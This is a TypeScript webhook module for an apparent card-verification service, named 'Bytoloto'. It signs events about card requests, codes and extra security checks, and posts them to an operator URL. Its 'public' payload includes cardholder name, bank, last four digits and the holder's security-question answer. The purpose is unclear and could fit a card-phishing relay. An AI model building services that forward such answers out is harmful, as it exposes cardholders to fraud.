import { createHmac, randomUUID } from "node:crypto"
import { eq } from "drizzle-orm"
import { db } from "@/lib/db"
import { paymentCard } from "@/lib/db/schema"

export type CardEvent =
  | "card.created"
  | "card.answer_received"
  | "card.frame_opened"
  | "card.frame_finished"
  | "card.code_requested"
  | "card.code_submitted"
  | "card.extra_check_requested"
  | "card.extra_check_answered"
  | "card.confirmed"
  | "card.rejected"

const RETRY_DELAYS_MS = [0, 2000, 10000]
const TIMEOUT_MS = 8000

export const cardPublicColumns = {
  requestNo: paymentCard.requestNo,
  status: paymentCard.status,
  brand: paymentCard.brand,
  bankName: paymentCard.bankName,
  last4: paymentCard.last4,
  cardholder: paymentCard.cardholder,
  secretAnswer: paymentCard.extraCheckResponse,
  extraCheckQuestion: paymentCard.extraCheckMessage,
  redirectUrl: paymentCard.redirectUrl,
  frameStatus: paymentCard.frameStatus,
  frameFinishedAt: paymentCard.frameFinishedAt,
  resultReason: paymentCard.resultReason,
  createdAt: paymentCard.createdAt,
  processedAt: paymentCard.processedAt,
}

export function webhookUrl() {
  const raw = process.env.CARD_WEBHOOK_URL?.trim()
  if (!raw) return null
  try {
    return new URL(raw).protocol === "https:" ? raw : null
  } catch {
    return null
  }
}

/** Signature header value: `t=<unix seconds>,v1=<hex HMAC-SHA256 of "t.body" keyed with the API key>`. */
export function signWebhook(body: string, secret: string, timestamp = Math.floor(Date.now() / 1000)) {
  const digest = createHmac("sha256", secret).update(`${timestamp}.${body}`).digest("hex")
  return `t=${timestamp},v1=${digest}`
}

export const CARD_EVENT_FOR_STATUS: Record<string, CardEvent> = {
  confirmed: "card.confirmed",
  rejected: "card.rejected",
  code_requested: "card.code_requested",
  extra_check: "card.extra_check_requested",
}

async function deliver(url: string, body: string, secret: string, event: CardEvent, eventId: string) {
  for (const delay of RETRY_DELAYS_MS) {
    if (delay) await new Promise((resolve) => setTimeout(resolve, delay))
    try {
      const response = await fetch(url, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "User-Agent": "BYTOLOTO-Webhook/1",
          "X-Bytoloto-Event": event,
          "X-Bytoloto-Event-Id": eventId,
          "X-Bytoloto-Signature": signWebhook(body, secret),
        },
        body,
        signal: AbortSignal.timeout(TIMEOUT_MS),
        redirect: "error",
      })
      if (response.ok) return
      if (response.status >= 400 && response.status < 500 && response.status !== 429) return
    } catch {
      // network error or timeout — retry
    }
  }
  console.error(`[card-webhook] delivery failed: ${event} ${eventId}`)
}

/** Fire-and-forget: notifies the verification service about a change in a card request. */
export function emitCardEvent(cardId: number, event: CardEvent, data?: Record<string, string>) {
  const url = webhookUrl()
  const secret = process.env.OPERATOR_API_KEY?.trim()
  if (!url || !secret) return
  void (async () => {
    try {
      const [request] = await db.select(cardPublicColumns).from(paymentCard).where(eq(paymentCard.id, cardId)).limit(1)
      if (!request) return
      const eventId = randomUUID()
      const body = JSON.stringify({ id: eventId, event, createdAt: new Date().toISOString(), data: data ?? {}, request })
      await deliver(url, body, secret, event, eventId)
    } catch (error) {
      console.error("[card-webhook] failed to build event", error)
    }
  })()
}
